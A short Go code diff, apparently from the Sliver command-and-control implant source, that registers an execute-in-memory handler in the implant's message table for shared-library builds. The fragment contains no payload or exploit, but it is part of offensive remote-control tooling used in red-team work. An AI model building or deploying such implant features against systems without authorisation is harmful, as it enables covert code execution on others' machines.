@@ -60,6 +60,11 @@ var (
 		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
 		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
 		// {{end}}
+
+		// {{if .Config.IsSharedLib}}
+		// CGO specific
+		sliverpb.MsgExecuteInMemoryReq: executeInMemoryHandler,
+		// {{end}}
 	}
 )
 
